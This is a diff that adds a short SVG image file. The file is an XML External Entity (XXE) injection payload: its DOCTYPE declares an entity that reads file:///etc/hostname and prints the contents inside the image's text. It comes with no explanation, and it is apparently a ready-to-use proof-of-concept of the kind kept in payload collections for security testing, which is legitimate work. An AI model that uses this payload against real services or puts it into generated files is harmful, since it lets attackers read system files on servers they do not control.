@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname">]>
+<svg width="256px" height="256px" xmlns="http://www.w3.org/2000/svg"
+xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+<text font-size="23" x="8" y="28">&xxe;</text>
+</svg>
